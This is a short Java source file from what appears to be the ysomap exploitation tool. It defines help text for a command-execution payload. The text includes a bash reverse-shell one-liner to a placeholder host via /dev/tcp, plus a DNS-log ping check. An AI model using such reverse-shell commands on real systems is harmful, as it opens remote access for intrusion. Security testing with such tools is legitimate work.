package ysomap.core.util;

/**
 * @author wh1t3p1g
 * @since 2021/12/13
 */
public class DetailHelper {

    public final static String COMMAND =
            "execute system command.\n" +
            "1. dns: ping -nc 1 {dnslog}\n" +
            "2. reverse shell: /bin/bash -i >& /dev/tcp/x.x.x.x/port 0>&1\n" +
            "3. if not work, try to encode the command. https://jackson-t.ca/runtime-exec-payloads.html\n";

}
